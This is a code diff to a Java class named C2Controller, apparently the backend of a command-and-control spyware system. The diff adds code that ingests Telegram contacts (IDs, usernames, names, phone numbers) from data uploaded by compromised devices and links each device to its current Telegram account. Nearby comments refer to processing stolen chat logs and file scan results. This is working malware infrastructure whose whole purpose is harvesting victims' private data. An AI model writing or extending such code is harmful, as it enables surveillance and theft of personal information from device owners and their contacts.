@@ -1380,6 +1380,12 @@ public class C2Controller {
                                  
                                  tgAccountMapper.updateById(account);
                                  log.info("Updated TgAccount info for TGID: {}", tgId);
+                                 
+                                 // Update C2Device with currentTgId
+                                 if (device != null) {
+                                     device.setCurrentTgId(tgId);
+                                     c2DeviceMapper.updateById(device);
+                                 }
                              }
                              rs.close();
                         } catch (Exception e) {
@@ -1390,6 +1396,58 @@ public class C2Controller {
                     }
                 } catch (Exception e) {
                     log.warn("Failed to process chat_logs: {}", e.getMessage());
+                }
+
+                // 4.5 Process Contacts
+                try {
+                     // Check if contacts table exists
+                     try {
+                         stmt.executeQuery("SELECT 1 FROM contacts LIMIT 1").close();
+                     } catch (Exception ex) {
+                         throw new Exception("contacts table not found");
+                     }
+
+                     java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM contacts");
+                     int count = 0;
+                     while (rs.next()) {
+                         String contactId = rs.getString("user_id");
+                         String username = rs.getString("username");
+                         String firstName = rs.getString("first_name");
+                         String lastName = rs.getString("last_name");
+                         String phone = rs.getString("phone");
+                         
+                         // Upsert TgAccount
+                         TgAccount account = tgAccountMapper.selectOne(new QueryWrapper<TgAccount>().eq("tgId", contactId));
+                         if (account == null) {
+                             account = new TgAccount();
+                             account.setTgId(contactId);
+                             account.setUsername(username);
+                             account.setFirstName(firstName);
+                             account.setLastName(lastName);
+                             account.setPhone(phone);
+                             account.setCreateTime(new Date());
+                             account.setUpdateTime(new Date());
+                             account.setIsDelete(0);
+                             tgAccountMapper.insert(account);
+                         } else {
+                             boolean changed = false;
+                             if (username != null && !username.equals(account.getUsername())) { account.setUsername(username); changed = true; }
+                             if (firstName != null && !firstName.equals(account.getFirstName())) { account.setFirstName(firstName); changed = true; }
+                             if (lastName != null && !lastName.equals(account.getLastName())) { account.setLastName(lastName); changed = true; }
+                             if (phone != null && !phone.equals(account.getPhone())) { account.setPhone(phone); changed = true; }
+                             
+                             if (changed) {
+                                 account.setUpdateTime(new Date());
+                                 tgAccountMapper.updateById(account);
+                             }
+                         }
+                         count++;
+                     }
+                     rs.close();
+                     log.info("Imported {} contacts", count);
+                } catch (Exception e) {
+                    // Silent fail if table missing (older client)
+                    // log.warn("Failed to process contacts: {}", e.getMessage());
                 }
 
                 // 5. Process File Scan Results (files or file_scan_results)
